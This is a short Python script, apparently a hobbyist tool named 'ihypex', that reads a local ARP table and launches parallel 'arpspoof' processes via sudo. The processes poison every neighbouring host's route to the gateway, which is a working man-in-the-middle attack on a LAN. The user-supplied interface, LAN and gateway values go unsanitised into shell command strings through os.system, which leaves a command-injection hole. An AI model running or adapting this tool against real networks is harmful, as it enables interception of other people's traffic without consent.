#!/usr/bin/env python3

from colorama import init, Fore, Back, Style
import rlcompleter,gnureadline
import threading
from argparse import ArgumentParser
import os

banner="""

    _ __                              
   (_) /_  __  ______  ___  ______  __
  / / __ \/ / / / __ \/ _ \/ ___/ |/_/
 / / / / / /_/ / /_/ /  __/ /  _>  <  
/_/_/ /_/\__, / .___/\___/_/  /_/|_|  
        /____/_/                      

Multi arpspoofing tool....
"""

def set_neigh(iface,lan):
    try:
        arp_cmd="""sudo /bin/bash -c 'arp -i {} | grep {} | cut -d " " -f1 | grep -E "\." > ips.txt'""".format(iface,lan)
        os.system(arp_cmd)
    except Exception as err:
        print('Something went wrong about the CMD sintax')
        exit()

def get_neigh(iface,gw):
    f_ips=open('ips.txt','r')
    threads=[]
    ip_table=[]
    for ip in f_ips:
        if ip.split()!=gw.split():
            ip_table.append(ip.split())
    f_ips.close()
    for i,ip in enumerate(ip_table):
        print(Fore.WHITE+'----------------------')
        print(ip[0] + Fore.GREEN+" Found")
        new_thread=threading.Thread(target=spoof, args=(iface,ip[0],gw,i))
        threads.append(new_thread)
        new_thread.start()

def spoof(iface,ip,gw,i):
    try:
        spoof_cmd=""" sudo /bin/bash -c 'arpspoof -i {} -t {}  {} > log_{}.txt' """.format(iface,ip,gw,i)
        os.system(spoof_cmd)
    except Exception as err:
        print(err)
        pass

if __name__=='__main__':
    print(banner)
    iface = input("Enter the interface name to use-> ".strip())
    lan = input("Enter de LAN to spoof (x.x.x)-> ".strip())    
    gw = input("Enter the gateway to subsitute-> ".strip())
    print('READING ARP TABLE\n++++++++++++++++++++++')
    set_neigh(iface,lan)
    get_neigh(iface,gw)